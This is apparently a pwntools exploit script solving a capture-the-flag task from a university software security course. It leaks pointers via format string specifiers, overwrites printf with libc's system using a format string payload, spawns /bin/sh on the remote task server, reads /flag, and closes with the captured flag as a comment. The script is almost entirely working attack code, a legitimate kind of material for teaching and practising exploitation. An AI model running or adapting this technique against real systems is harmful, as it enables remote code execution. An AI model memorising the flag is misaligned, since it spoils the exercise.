from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

elf = context.binary = ELF('vuln')
libc = ELF("./libc.so.6")

# for debugging
gdbscript = '''
file vuln
b main
b *(main+108)
'''.format(**locals())
#p = gdb.debug(["./vuln"], gdbscript=gdbscript, )
with open("gdbscript", "w") as f:
    f.write(gdbscript)


#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#input()

# start remote
p = remote('tasks.ws24.softsec.rub.de', 33222)


p.sendline(b"give ptr: %37$p")
p.recvuntil(b"give ptr: ")
ptr = int(p.recvline().decode()[2:], 16)
print(f"got ptr: {hex(ptr)}")


p.sendline(b"give ptr: %35$p")
p.recvuntil(b"give ptr: ")
ptr_libc = int(p.recvline().decode()[2:], 16) - 160330
print(f"got ptr_libc: {hex(ptr_libc)}")




libc.address = ptr_libc


# payload opening a shell
writes = {ptr+12120: libc.symbols["system"]}
payload = fmtstr_payload(14, writes, numbwritten=0)
# we overwrite printf with system and use ; to make /bin/sh execute no matter the stuff before
# as before this string there obviously is our %n payload already which is not a valid command
# maybe place /bin/sh first to circumvent this
payload += b";       "
payload += b"/bin/sh\0"
payload += p64(ptr)
# entire payload
p.sendline(payload)

# get flag
p.sendline(b"cat /flag")

# see outputted flag
p.interactive()

#softsec{os3MunZeawQmxfjqHsKCau_RXHi8aTqFG1BiMU-oUl50NID7R-vOrVrl1wsEUf2u}